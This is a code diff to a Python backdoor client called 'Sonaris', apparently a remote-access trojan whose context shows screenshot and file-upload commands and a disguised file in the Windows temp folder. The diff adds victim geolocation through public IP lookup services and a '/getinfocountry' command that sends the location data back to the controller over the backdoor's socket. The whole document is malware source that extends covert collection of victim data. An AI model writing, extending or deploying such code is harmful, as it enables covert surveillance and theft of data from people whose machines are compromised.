@@ -13,6 +13,7 @@ from getpass import getuser
 from os import path, chdir, remove
 from sys import exit
 from time import sleep
+import json
 from pickle import loads, dumps
 from platform import uname
 from wmi import WMI
@@ -26,13 +27,14 @@ packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Sonaris(object):
     ''' client object '''
-    def __init__(self, host, port, ip):
+    def __init__(self, host, port, ip, infocountry):
         self.__Adress = (host, port)
         self.__Client = None
         self._CmdBufferSize = 256
         self._HeaderBufferSize = 512
         self._FullBufferSize = 65536
         self.Path = 'C:/Windows/Temp/736f6e61726973.png'
+        self.InfoCountry = infocountry
         self.Info = {
                 'ComputerName': f'{getuser()}',
                 'SO': f'{uname()[0]}',
@@ -186,6 +188,8 @@ class Sonaris(object):
             self.Screenshot()
         elif(command[:7] == '/upload'):
             self.UploadFiles()
+        elif(command.strip() == '/getinfocountry'):
+            self.__Client.send(self.InfoCountry.encode())
         else:
             return command
 
@@ -218,10 +222,16 @@ class Sonaris(object):
 def main():
     try:
         ip = get('https://api.ipify.org/').content.decode()
-    except:
-        ip = 'Error'
+        info = json.loads(get('http://ip-api.com/json/'+ip).text)
+        result = ''
+        for x in info.items():
+            result += f'{x[0]}: {x[1]}\n'
 
-    backdoor = Sonaris('127.0.0.1', 0000, ip)
+    except Exception:
+        ip = 'Error'
+        result = 'Error'
+
+    backdoor = Sonaris('127.0.0.1', 0000, ip, result)
     backdoor.Main()
 
 if(__name__ == '__main__'):
